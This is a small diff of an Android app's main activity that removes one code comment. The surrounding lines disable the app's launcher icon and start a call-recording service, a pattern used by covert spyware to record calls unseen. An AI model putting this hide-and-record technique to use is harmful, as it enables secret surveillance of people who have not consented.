@@ -24,7 +24,7 @@ public class MainActivity extends Activity {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
         }
         PackageManager p = getPackageManager();
-        ComponentName componentName = new ComponentName(this, sachinvarma.smaple.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+        ComponentName componentName = new ComponentName(this, sachinvarma.smaple.MainActivity.class); 
         p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         Intent intent = new Intent(this, CallRecordingService.class);
         startService(intent);
